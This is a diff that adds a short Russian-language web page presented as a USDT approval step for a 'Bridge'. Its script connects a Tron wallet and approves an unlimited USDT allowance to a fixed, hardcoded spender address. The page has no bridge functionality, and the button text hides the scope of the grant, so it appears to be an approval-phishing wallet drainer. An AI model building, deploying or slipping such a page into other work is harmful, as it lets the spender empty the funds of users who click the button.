@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Approve USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+</head>
+<body>
+  <h2>Approve USDT для Bridge</h2>
+  <button id="approveBtn">Подключить и подтвердить</button>
+
+  <script>
+    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const SPENDER = 'TXN5uDg2D5bvpC91AUG1YP63rag775HfHg';
+    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+    document.getElementById('approveBtn').addEventListener('click', async () => {
+      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+        alert('Пожалуйста, подключите TronLink или Trust Wallet через DApp-браузер.');
+        return;
+      }
+
+      try {
+        const contract = await tronWeb.contract().at(USDT_CONTRACT);
+        const tx = await contract.approve(SPENDER, MAX_UINT256).send({
+          feeLimit: 100_000_000
+        });
+        alert('Транзакция отправлена! TX ID: ' + tx);
+      } catch (err) {
+        console.error(err);
+        alert('Ошибка при вызове approve: ' + err.message);
+      }
+    });
+  </script>
+</body>
+</html>
